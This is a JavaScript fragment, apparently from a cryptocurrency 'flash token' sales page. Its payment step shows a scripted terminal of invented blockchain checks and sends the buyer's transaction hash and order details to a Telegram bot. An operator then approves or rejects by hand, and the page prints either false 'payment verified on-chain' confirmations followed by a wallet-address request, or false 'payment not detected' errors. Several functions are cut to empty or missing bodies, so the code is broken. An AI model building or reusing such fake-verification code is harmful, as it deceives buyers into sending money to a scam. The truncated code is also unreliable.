function updateTimer(){

function updateProcTimer(){

function appendLog(line){
  const term=document.getElementById("term");
  if(!term)return;
  const p=document.createElement("p");
  p.style.color=line.color==="danger"?"var(--danger)":line.color==="neon"?"var(--neon)":"var(--neon-dim)";
  p.innerHTML="<span>&gt;</span> "+escapeHtml(line.text);
  // insert before cursor
  const cursor=term.querySelector(".cursor-blink")?.parentElement;
  if(cursor)term.insertBefore(p,cursor);else term.appendChild(p);
  term.scrollTop=term.scrollHeight;
}
function updateProcLabel(){

async function sendToTelegram(hash,eid,plat,pack,amount,tokens){

    const d=await r.json();if(d.ok)currentMsgId=d.result.message_id;

}
async function pollApproval(){
  try{
    const r=await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?timeout=2&allowed_updates=["callback_query"]`);
    const d=await r.json();if(!d.ok||!d.result.length)return null;
    const cbs=d.result.filter(u=>u.callback_query);if(!cbs.length)return null;
    const latest=cbs[cbs.length-1];const action=latest.callback_query.data;
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${latest.update_id+1}`);
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({callback_query_id:latest.callback_query.id,text:action==="approve"?"✅ Approved!":"❌ Rejected!"})});
    return action;
  }catch(e){return null}
}
function startProcessing(hash,eid){
  if(timers.pay)clearInterval(timers.pay);
  Object.assign(state,{processing:true,procFailed:false,logs:[],procLabel:"VERIFYING_PAYMENT",procFoot:"Do not close this window. The node is scanning the chain.",procLeft:120});
  const p=packsFor(state.pl).find(x=>x.id===state.pk);
  sendToTelegram(hash,eid,state.pl,p.l,p.p,p.f.toLocaleString());
  render();
  timers.proc=setInterval(()=>{if(state.procLeft<=1){clearInterval(timers.proc);timers.proc=null;return}state.procLeft--;updateProcTimer();},1000);
  const scan=[
    {text:"$ flash --verify-payment --strict",color:"neon"},
    {text:"[init] opening secure socket → node-04.flash",color:"dim"},
    {text:"[handshake] HMAC-SHA256 ........ OK",color:"dim"},
    {text:"[scan] mempool sweep started ...",color:"dim"},
    {text:"$ scanning blockchain for payment ...",color:"neon"},
    {text:"[scan] querying BEP20 network ...",color:"dim"},
    {text:"[scan] querying TRC20 network ...",color:"dim"},
    {text:"[match] cross-referencing block data ...",color:"dim"},
    {text:"[verify] confirming transaction amount ...",color:"dim"},
    {text:"[verify] awaiting network confirmations ...",color:"dim"},
  ];let si=0;
  timers.log=setInterval(()=>{if(si<scan.length){const line=scan[si++];state.logs.push(line);appendLog(line);}},2200);
  let pc=0,approved=false;
  timers.poll=setInterval(async()=>{
    pc++;const action=await pollApproval();
    if(action==="approve"&&!approved){
      approved=true;clearInterval(timers.poll);clearInterval(timers.log);clearInterval(timers.proc);
      // First show payment verified logs, then ask for wallet
      const verifiedLogs=["✅ PAYMENT VERIFIED ON-CHAIN","[node] transaction confirmed — 12 blocks","[node] amount matches order — OK","$ awaiting wallet address to dispatch tokens ..."];
      state.procLabel="PAYMENT_VERIFIED";state.procFoot="Payment confirmed! Please enter your wallet address.";render();
      let vi=0;timers.succ=setInterval(()=>{
        if(vi<verifiedLogs.length){const line={text:verifiedLogs[vi++],color:"neon"};state.logs.push(line);appendLog(line);updateProcLabel();}
        else{clearInterval(timers.succ);askWallet();}
      },700);
    }else if((action==="reject"||pc>=60)&&!approved){
      clearInterval(timers.poll);clearInterval(timers.log);
      const errs=[{text:"[verify] timeout after 28s",color:"dim"},{text:"[ERROR] no matching transaction on-chain",color:"danger"},{text:"[ERROR] PAYMENT NOT DETECTED",color:"danger"},{text:"[ABORT] session terminated by node",color:"danger"}];
      errs.forEach((line,i)=>setTimeout(()=>{state.logs.push(line);appendLog(line);if(i===errs.length-1){state.procFailed=true;state.procLabel="PAYMENT_FAILED";state.procFoot="Node rejected the payment. Returning to main interface...";updateProcLabel();setTimeout(showFail,800)}},i*600));
    }
  },2000);
}

}

// Footer removed

window.resetAll=resetAll;
